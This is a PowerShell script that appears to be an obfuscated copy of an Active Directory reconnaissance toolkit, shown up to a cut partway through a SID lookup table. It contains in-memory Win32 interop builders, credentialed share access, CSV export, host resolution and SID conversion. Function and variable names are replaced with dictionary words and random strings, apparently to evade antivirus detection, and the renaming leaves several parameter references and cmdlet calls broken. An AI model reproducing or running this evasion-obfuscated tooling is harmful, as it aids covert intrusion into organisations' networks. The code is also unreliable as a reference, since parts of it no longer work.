function embryonic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $kgFaRInd99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $YSaPqBmT99 = $kgFaRInd99.GetAssemblies()
    foreach ($SJdNvGnk99 in $YSaPqBmT99) {
        if ($SJdNvGnk99.FullName -and ($SJdNvGnk99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $SJdNvGnk99
        }
    }
    $rfUmwNkH99 = New-Object Reflection.AssemblyName($ModuleName)
    $gddrYpaX99 = $kgFaRInd99
    $vrFruBTZ99 = $gddrYpaX99.DefineDynamicAssembly($rfUmwNkH99, 'Run')
    $WwUsLNET99 = $vrFruBTZ99.DefineDynamicModule($ModuleName, $False)
    return $WwUsLNET99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $yyRlEYnl99,
        [Switch]
        $SetLastError
    )
    $PjvsRTzX99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $PjvsRTzX99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $PjvsRTzX99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $PjvsRTzX99['Charset'] = $Charset }
    if ($SetLastError) { $PjvsRTzX99['SetLastError'] = $SetLastError }
    if ($yyRlEYnl99) { $PjvsRTzX99['EntryPoint'] = $yyRlEYnl99 }
    New-Object PSObject -Property $PjvsRTzX99
}
function personalizes
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $yyRlEYnl99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $mcnxCcgw99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $mcnxCcgw99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $mcnxCcgw99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$mcnxCcgw99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $mcnxCcgw99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $mcnxCcgw99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $yCCcshgi99 = $mcnxCcgw99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($xOQSUOVX99 in $ParameterTypes)
            {
                if ($xOQSUOVX99.IsByRef)
                {
                    [void] $yCCcshgi99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $oMGsQoJw99 = [Runtime.InteropServices.DllImportAttribute]
            $ajkbHowx99 = $oMGsQoJw99.GetField('SetLastError')
            $mZJMcIOd99 = $oMGsQoJw99.GetField('CallingConvention')
            $MCRjrkwb99 = $oMGsQoJw99.GetField('CharSet')
            $IwTzccLu99 = $oMGsQoJw99.GetField('EntryPoint')
            if ($SetLastError) { $jxHWStLu99 = $True } else { $jxHWStLu99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $DtDraaIh99 = $yyRlEYnl99 } else { $DtDraaIh99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $KghCFKtR99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($ajkbHowx99,
                                           $mZJMcIOd99,
                                           $MCRjrkwb99,
                                           $IwTzccLu99),
                [Object[]] @($jxHWStLu99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $DtDraaIh99))
            $yCCcshgi99.SetCustomAttribute($KghCFKtR99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $mcnxCcgw99
        }
        $GJEJvMTW99 = @{}
        foreach ($Key in $mcnxCcgw99.Keys)
        {
            $Type = $mcnxCcgw99[$Key].CreateType()
            $GJEJvMTW99[$Key] = $Type
        }
        return $GJEJvMTW99
    }
}
function lobbed {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $hAOGKuDi99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $tkxUIunX99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($hAOGKuDi99))
    }
    $ypBUXFXS99 = $Type -as [Type]
    $aWtCNFLV99 = $Module.DefineEnum($hAOGKuDi99, 'Public', $ypBUXFXS99)
    if ($Bitfield)
    {
        $CtuVeKtW99 = [FlagsAttribute].GetConstructor(@())
        $irimMXxS99 = New-Object Reflection.Emit.CustomAttributeBuilder($CtuVeKtW99, @())
        $aWtCNFLV99.SetCustomAttribute($irimMXxS99)
    }
    foreach ($Key in $tkxUIunX99.Keys)
    {
        $null = $aWtCNFLV99.DefineLiteral($Key, $tkxUIunX99[$Key] -as $ypBUXFXS99)
    }
    $aWtCNFLV99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $OVaVRnjg99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $MmzaDoyA99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $OVaVRnjg99
        Type = $Type -as [Type]
        Offset = $MmzaDoyA99
        MarshalAs = $MarshalAs
    }
}
function peelings
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $hAOGKuDi99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $FAdXavMH99,
        [Reflection.Emit.PackingSize]
        $wYpbekvk99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $rqiiifvF99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($hAOGKuDi99))
    }
    [Reflection.TypeAttributes] $IFItUArT99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($rqiiifvF99)
    {
        $IFItUArT99 = $IFItUArT99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $IFItUArT99 = $IFItUArT99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $looJKySl99 = $Module.DefineType($hAOGKuDi99, $IFItUArT99, [ValueType], $wYpbekvk99)
    $hdcQpkyT99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $pfTpwpLp99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $QzHwryPa99 = New-Object Hashtable[]($FAdXavMH99.Count)
    foreach ($Field in $FAdXavMH99.Keys)
    {
        $Index = $FAdXavMH99[$Field]['Position']
        $QzHwryPa99[$Index] = @{FieldName = $Field; Properties = $FAdXavMH99[$Field]}
    }
    foreach ($Field in $QzHwryPa99)
    {
        $MBlcvrZJ99 = $Field['FieldName']
        $fuLsypgz99 = $Field['Properties']
        $MmzaDoyA99 = $fuLsypgz99['Offset']
        $Type = $fuLsypgz99['Type']
        $MarshalAs = $fuLsypgz99['MarshalAs']
        $HYzQwKOR99 = $looJKySl99.DefineField($MBlcvrZJ99, $Type, 'Public')
        if ($MarshalAs)
        {
            $bBPJyqJI99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $VISBlCYt99 = New-Object Reflection.Emit.CustomAttributeBuilder($hdcQpkyT99,
                    $bBPJyqJI99, $pfTpwpLp99, @($Size))
            }
            else
            {
                $VISBlCYt99 = New-Object Reflection.Emit.CustomAttributeBuilder($hdcQpkyT99, [Object[]] @($bBPJyqJI99))
            }
            $HYzQwKOR99.SetCustomAttribute($VISBlCYt99)
        }
        if ($rqiiifvF99) { $HYzQwKOR99.SetOffset($MmzaDoyA99) }
    }
    $IPfRGVFW99 = $looJKySl99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $UyoFvoJK99 = $IPfRGVFW99.GetILGenerator()
    $UyoFvoJK99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $looJKySl99)
    $UyoFvoJK99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $UyoFvoJK99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $UyoFvoJK99.Emit([Reflection.Emit.OpCodes]::Ret)
    $hSqCgHzu99 = $looJKySl99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $looJKySl99,
        [Type[]] @([IntPtr]))
    $QVSSLkuq99 = $hSqCgHzu99.GetILGenerator()
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Nop)
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $looJKySl99)
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $looJKySl99)
    $QVSSLkuq99.Emit([Reflection.Emit.OpCodes]::Ret)
    $looJKySl99.CreateType()
}
Function Victrola {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$CgvwYVvn99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$OVaVRnjg99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HpaKyQLw99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AjPUpCZs99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$hkdEeqLK99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$XNwSXrwg99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$MtPPfRbp99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$wVVOtiWW99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$FFswWAxR99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$qpDarOvk99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$bNWJruZR99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$pMXtGcRH99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ZBLeAPSI99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$QfpwoRuQ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$JilChBLT99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$xbUurrkB99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$EdWlPNlq99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$vHjlzVMz99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$KgKkGSIJ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $DhjtYwrM99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$modcDTlj99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $ADYXbIdr99
    )
    Begin {
        $KprnPVOP99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $YHbMYrJi99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($modcDTlj99) {
            $EdtxfFvq99 = $ADYXbIdr99.Keys | Where-Object { $YHbMYrJi99 -notcontains $_ }
            ForEach($xOQSUOVX99 in $EdtxfFvq99) {
                if ($xOQSUOVX99) {
                    Set-Variable -Name $xOQSUOVX99 -Value $ADYXbIdr99.$xOQSUOVX99 -Scope 1 -Force
                }
            }
        }
        else {
            $VYSqQwvp99 = @()
            $VYSqQwvp99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($VYSqQwvp99) {
                $VYSqQwvp99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $SuQntHjC99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($xOQSUOVX99 in $SuQntHjC99) {
                $rrrjAZTt99 = Get-Variable -Name $xOQSUOVX99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($xOQSUOVX99, [ref]$tmp) -and $rrrjAZTt99) {
                    $PSBoundParameters.$xOQSUOVX99 = $rrrjAZTt99
                }
            }
            if($DhjtYwrM99) {
                $UAgENhzH99 = $DhjtYwrM99
            }
            else {
                $UAgENhzH99 = $KprnPVOP99
            }
            $fWNTtNcX99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $zFQAfVfq99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $fxZCEluS99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $GlZmLxUo99 = '^Alias$'
            $rYPejBqs99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $zFQAfVfq99 {
                    Try {
                        $rYPejBqs99.$_ = . $fWNTtNcX99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($UAgENhzH99.Keys -contains $Name) {
                $UAgENhzH99.$Name.Attributes.Add($rYPejBqs99)
            }
            else {
                $baTAvmvh99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $fxZCEluS99 {
                        Try {
                            $hilmZrDB99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $fWNTtNcX99) -ErrorAction Stop
                            $baTAvmvh99.Add($hilmZrDB99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $GlZmLxUo99 {
                        Try {
                            $viuHbAUl99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $fWNTtNcX99) -ErrorAction Stop
                            $baTAvmvh99.Add($viuHbAUl99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $baTAvmvh99.Add($rYPejBqs99)
                $xOQSUOVX99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $baTAvmvh99)
                $UAgENhzH99.Add($Name, $xOQSUOVX99)
            }
        }
    }
    End {
        if(!$modcDTlj99 -and !$DhjtYwrM99) {
            $UAgENhzH99
        }
    }
}
function devilment {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $THEDaoqz99
    )
    BEGIN {
        $StuOJRFu99 = @{}
    }
    PROCESS {
        ForEach ($WVpqhVQc99 in $Path) {
            if (($WVpqhVQc99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $tWXZQGKv99 = (New-Object System.Uri($WVpqhVQc99)).Host
                if (-not $StuOJRFu99[$tWXZQGKv99]) {
                    unhooking -lgkTdAeF99 $tWXZQGKv99 -xjRyyQze99 $xjRyyQze99
                    $StuOJRFu99[$tWXZQGKv99] = $True
                }
            }
            if (Test-Path -Path $WVpqhVQc99) {
                if ($PSBoundParameters['OutputObject']) {
                    $haHcNjhJ99 = New-Object PSObject
                }
                else {
                    $haHcNjhJ99 = @{}
                }
                Switch -Regex -File $WVpqhVQc99 {
                    "^\[(.+)\]" # Section
                    {
                        $XtQdsvdE99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $XtQdsvdE99 = $XtQdsvdE99.Replace(' ', '')
                            $mjvjvLHi99 = New-Object PSObject
                            $haHcNjhJ99 | Add-Member Noteproperty $XtQdsvdE99 $mjvjvLHi99
                        }
                        else {
                            $haHcNjhJ99[$XtQdsvdE99] = @{}
                        }
                        $JxlARzgZ99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $JxlARzgZ99 = $JxlARzgZ99 + 1
                        $Name = 'Comment' + $JxlARzgZ99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $haHcNjhJ99.$XtQdsvdE99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $haHcNjhJ99[$XtQdsvdE99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $OdVLpgEK99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $haHcNjhJ99.$XtQdsvdE99 | Add-Member Noteproperty $Name $OdVLpgEK99
                        }
                        else {
                            $haHcNjhJ99[$XtQdsvdE99][$Name] = $OdVLpgEK99
                        }
                    }
                }
                $haHcNjhJ99
            }
        }
    }
    END {
        $StuOJRFu99.Keys | shoeing
    }
}
function sidings {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $MnfPrxTx99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $hDJwGJAm99 = ',',
        [Switch]
        $MsPURVMQ99
    )
    BEGIN {
        $BhxsBfkm99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $AyEdJDRR99 = [System.IO.File]::Exists($BhxsBfkm99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $LPXKKcjR99 = [System.IO.FileMode]::Append
        }
        else {
            $LPXKKcjR99 = [System.IO.FileMode]::Create
            $AyEdJDRR99 = $False
        }
        $NEBsSKpv99 = New-Object IO.FileStream($BhxsBfkm99, $LPXKKcjR99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $FIqhhuNO99 = New-Object System.IO.StreamWriter($NEBsSKpv99)
        $FIqhhuNO99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $MnfPrxTx99) {
            $GjiMfamI99 = ConvertTo-Csv -MnfPrxTx99 $Entry -hDJwGJAm99 $hDJwGJAm99 -NoTypeInformation
            if (-not $AyEdJDRR99) {
                $GjiMfamI99 | ForEach-Object { $FIqhhuNO99.WriteLine($_) }
                $AyEdJDRR99 = $True
            }
            else {
                $GjiMfamI99[1..($GjiMfamI99.Length-1)] | ForEach-Object { $FIqhhuNO99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $FIqhhuNO99.Dispose()
        $NEBsSKpv99.Dispose()
    }
}
function prioritize {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            try {
                @(([Net.Dns]::GetHostEntry($zNIilCKh99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[prioritize] Could not resolve $zNIilCKh99 to an IP Address."
            }
        }
    }
}
function remissions {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $sskuJSha99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $HJQBOaAb99 = @{}
        if ($PSBoundParameters['Domain']) { $HJQBOaAb99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $HJQBOaAb99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Credential']) { $HJQBOaAb99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        ForEach ($Object in $sskuJSha99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = macrocosms -phaEiMpW99 $Object -xilKAxpM99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $qgzVOkSs99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $QuaUtxHk99 = $DN.Split(',')[0].split('=')[1]
                    $HJQBOaAb99['Identity'] = $QuaUtxHk99
                    $HJQBOaAb99['Domain'] = $qgzVOkSs99
                    $HJQBOaAb99['Properties'] = 'objectsid'
                    scram @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $gddrYpaX99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $HJQBOaAb99 = @{}
                        $gddrYpaX99 = (retrenchments @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($gddrYpaX99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[remissions] Error converting $gddrYpaX99\$Object : $_"
                }
            }
        }
    }
}
function exaggerations {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $aBusFQKN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $OSvdjCmE99 = @{}
        if ($PSBoundParameters['Domain']) { $OSvdjCmE99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $OSvdjCmE99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Credential']) { $OSvdjCmE99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        ForEach ($SLqiOELZ99 in $aBusFQKN99) {
            $SLqiOELZ99 = $SLqiOELZ99.trim('*')
            try {
                Switch ($SLqiOELZ99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
